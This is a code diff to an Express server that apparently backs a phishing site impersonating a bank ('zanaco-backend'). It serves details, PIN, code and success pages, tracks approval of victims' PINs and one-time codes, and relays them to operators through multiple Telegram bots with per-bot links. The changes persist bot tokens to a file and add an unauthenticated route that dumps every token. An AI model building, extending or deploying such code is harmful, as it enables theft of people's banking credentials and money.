@@ -3,9 +3,11 @@ const express = require('express');
 const axios = require('axios');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
+const BOTS_FILE = path.join(__dirname, 'bots.json');
 
 // ---------------- MEMORY STORES ----------------
 const approvedPins = {};      // requestId -> true/false/null
@@ -13,19 +15,33 @@ const approvedCodes = {};     // requestId -> true/false/null
 const requestBotMap = {};     // requestId -> botId
 
 // ---------------- MULTI-BOT STORE ----------------
-const bots = [
-    {
-        botId: 'bot1',
-        botToken: process.env.BOT1_TOKEN,
-        chatId: process.env.BOT1_CHATID
-    },
-    {
-        botId: 'bot2',
-        botToken: process.env.BOT2_TOKEN,
-        chatId: process.env.BOT2_CHATID
+// Load bots from JSON file if exists, otherwise initialize with default
+let bots = [];
+if (fs.existsSync(BOTS_FILE)) {
+    try {
+        bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf-8'));
+        console.log('✅ Bots loaded from bots.json:', bots);
+    } catch (err) {
+        console.error('❌ Failed to load bots.json, using defaults:', err);
+        bots = [];
     }
-];
-
+} else {
+    // Initial bots from .env
+    bots = [
+        {
+            botId: 'bot1',
+            botToken: process.env.BOT1_TOKEN,
+            chatId: process.env.BOT1_CHATID
+        },
+        {
+            botId: 'bot2',
+            botToken: process.env.BOT2_TOKEN,
+            chatId: process.env.BOT2_CHATID
+        }
+    ];
+    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
+    console.log('✅ Default bots saved to bots.json');
+}
 
 // ---------------- MIDDLEWARE ----------------
 app.use(express.json());
@@ -37,6 +53,11 @@ function getBot(botId) {
     return bots.find(b => b.botId === botId);
 }
 
+function saveBots() {
+    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
+}
+
+// ---------------- TELEGRAM HELPERS ----------------
 async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
     try {
         await axios.post(
@@ -65,16 +86,25 @@ async function answerCallback(bot, callbackId) {
     }
 }
 
-// ---------------- DYNAMIC PAGE SERVING ----------------
-// Serve index.html or other pages with botId in URL
-app.get('/bot/:botId', (req, res) => {
-    const bot = getBot(req.params.botId);
-    if (!bot) return res.status(404).send('Invalid bot link');
-
-    // Serve index.html first
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+// ---------------- ROOT REDIRECT ----------------
+app.get('/', (req, res) => {
+    // Redirect root domain to default bot
+    res.redirect('/bot/bot1');
 });
 
+// ---------------- DYNAMIC PAGE SERVING ----------------
+app.get('/bot/:botId', (req, res) => {
+    const bot = getBot(req.params.botId);
+    console.log(`🔎 Accessing botId: ${req.params.botId}`);
+    if (!bot) return res.status(404).send('Invalid bot link');
+
+    // Send index.html with botId as query param so frontend can read it
+    res.sendFile(path.join(__dirname, 'public', 'index.html'), {
+        headers: { 'Cache-Control': 'no-cache' }
+    });
+});
+
+// Serve other pages (details, pin, code, success)
 app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
@@ -158,6 +188,8 @@ app.post('/add-bot', async (req, res) => {
     if (getBot(botId)) return res.status(400).json({ error: 'Bot already exists' });
 
     bots.push({ botId, botToken, chatId });
+    saveBots();
+    console.log(`✅ Bot added: ${botId}`);
 
     const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${botId}`;
     try {
@@ -172,6 +204,11 @@ app.post('/add-bot', async (req, res) => {
         ok: true,
         botLink: `https://zanaco-backend.onrender.com/bot/${botId}`
     });
+});
+
+// ---------------- DEBUG ROUTE ----------------
+app.get('/debug/bots', (req, res) => {
+    res.json(bots);
 });
 
 // ---------------- START SERVER ----------------
